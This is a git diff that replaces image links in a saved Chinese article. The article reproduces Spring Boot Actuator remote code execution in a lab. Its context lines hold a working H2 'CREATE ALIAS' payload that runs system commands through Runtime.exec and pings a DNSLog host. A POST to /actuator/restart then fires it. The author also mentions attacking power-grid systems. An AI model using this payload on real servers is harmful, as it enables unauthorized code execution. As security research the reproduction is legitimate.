@@ -43,7 +43,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZcuHN-nd2KXh6khoD7Z_HQ)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFbXPGAIpeV3dickFDRx7ez7KcMVHXEQR6pIZwEECu7trC9K6oGuMUuPQ/640?wx_fmt=png)
+![](../../.resource/remote/fc9a3a9800c10ac68300e339417a29222c0c52b3c0c89613540a99423c151d2a.png)
 
 我的实战经验当中，南网的系统中遇到 Spring Boot 框架的概率最高。每次遇到 Spring Boot 框架的站点时，经常日不下来，不知道是不是自己的利用姿势有问题，所以还是搭建环境复现一下，以证明自己的姿势没问题。
 
@@ -77,7 +77,7 @@ Spring Boot >= 1.5
 
     2. 特有的报错信息 “Whitelabel Error Page”
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFGeTRZdtLiaUx9Np6Yp6cQSSpnKGvDJuIOlNRxThHbMVHda2M0cicXLQw/640?wx_fmt=png)
+![](../../.resource/remote/85b252eaa6ebaaef453832280f1ae2b389325f1613e94ded8366d659a875c805.png)
 
 这是官方文档对于每个端点的功能描述
 
@@ -87,11 +87,11 @@ Spring Boot 1.x 版本的端口是在根 URL 下注册的，而 Spring Boot 2.x 
 
 (1) 访问：http://192.168.100.133:8080/actuator
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFoflJ9oHriajn5AhSdmLwNKHWz0oicg4alXL5E9LYmgHRic1Gwtl1UiavwA/640?wx_fmt=png)
+![](../../.resource/remote/b653767fdca6a98325cd1941f27c795290d2650e2fb519e779ebca529ca47d57.png)
 
 <Chrome 浏览器视图 >
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFKfKoHgUCAJo2Vf6cJfrhdeBenpNF58GZAeq0DsU1FNMtf5gzxgWLpw/640?wx_fmt=png)
+![](../../.resource/remote/d8d1538603dde3c009aabaafdb38ef3ba0905d574b80280f711ff7885179c5bf.png)
 
 <FireFox 浏览器视图 >
 
@@ -106,13 +106,13 @@ Content-Length: 389
 {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('ping gkbtcq.dnslog.cn');"}
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFAz0yEfxymlkUrYHHhqw7ovPicKIJNq86mIwPJBUKaR2txMe0YWttTbg/640?wx_fmt=png)
+![](../../.resource/remote/41ec64b2f4cd0dd7617be27878ec97e472be5b01c75d45708a75b78a6cdb5cf7.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFPnlLnFZaaZ5iaVrHVWq7PFgpAGqgicRuouXyWHF1iatAMRGnPgz45DCkw/640?wx_fmt=png)
+![](../../.resource/remote/32986887098859bcea87c85ebae480ad1c4a4ad359587408ed8ec2fd34e301d2.png)
 
 发送完成后，查看 / actuator/env 信息
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHF5WC8B8qEdjTx5Q9ngfPl4FJX6zPkDlGNLM9PP0hb80stsqVEscQBKQ/640?wx_fmt=png)
+![](../../.resource/remote/93d4437bdf1389f6913c9f6476d834bc603929859b41db110915af9c242f6587.png)
 
 再向端点 / actuator/restart 发送 POST 请求，Payload 如下：
 
@@ -125,13 +125,13 @@ Content-Length: 356
 {}
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFNReP5hugFmKiaVWze8RE4PW9HDgEePmdkX3uz3B0hekxicftayVHibia9A/640?wx_fmt=png)
+![](../../.resource/remote/004d396ca2486ca5f4892c869ad1d3363861b896c995aa2345a19d564388187f.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHFicYHBzfo6vGmAWuotMlg9e98FETYQ0QOuVoXyzw7BTUJjibTic98yZLJQ/640?wx_fmt=png)
+![](../../.resource/remote/b04519d9248e43f8ea46a100e4e9735fe3a3708012e6d3f6c3313afdf3e9d230.png)
 
 重新启动成功，刷新 DNSLog 数据即可。  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2wIkV5jyFy5znjfkjUmlJHF6SNAC2IRt38cQhjkH83KO0GFctZ4erWRwuuC6aJ1LaOW1KyNCfYhfQ/640?wx_fmt=png)
+![](../../.resource/remote/6013549bd9e3a70a34f96035132de989d7d8c70b41b79e4db8041bf141f9b3d0.png)
 
 ---
 
